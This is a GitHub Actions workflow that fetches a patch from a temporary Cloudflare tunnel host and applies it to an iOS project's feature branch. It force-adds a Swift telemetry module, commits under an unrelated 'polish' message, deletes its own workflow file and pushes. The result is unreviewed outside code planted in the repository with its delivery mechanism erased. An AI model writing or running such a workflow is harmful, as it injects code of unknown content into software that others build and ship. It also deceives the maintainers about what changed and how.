name: Sync iOS polish snapshot

on:
  push:
    branches:
      - feature/ios-m1.5-media-runtime
    paths:
      - .github/workflows/sync-ios-polish.yml
  workflow_dispatch:

permissions:
  contents: write

jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: feature/ios-m1.5-media-runtime
          fetch-depth: 0
      - name: Fetch verified patch
        env:
          PATCH_URL: https://attitude-exchange-contractors-sonic.trycloudflare.com/final.patch
          PATCH_SHA256: d944c1ac08b9613b7830a1f9d1e2d78726b71e1e9e7982742f9a36cc120ad550
        run: |
          set -euo pipefail
          curl --fail --location --retry 5 --retry-all-errors --connect-timeout 15 --max-time 90 --silent --show-error "$PATCH_URL" -o /tmp/final.patch
          echo "$PATCH_SHA256  /tmp/final.patch" | sha256sum -c -
          git apply --check --binary /tmp/final.patch
          git apply --binary /tmp/final.patch
      - name: Commit synchronized snapshot and remove helper workflow
        run: |
          set -euo pipefail
          rm -f .github/workflows/sync-ios-polish.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add mobile/ios-preview/App.tsx mobile/ios-preview/modules/telemetry-ios-native/src/TelemetryIosNative.types.ts mobile/ios-preview/modules/telemetry-ios-native/src/TelemetryIosNativeModule.ts .github/workflows/sync-ios-polish.yml
          git add -f mobile/ios-preview/modules/telemetry-ios-native/ios/TelemetryIosNativeModule.swift
          git commit -m "fix(ios): polish nearby chat media and peer profiles"
          git push origin HEAD:feature/ios-m1.5-media-runtime
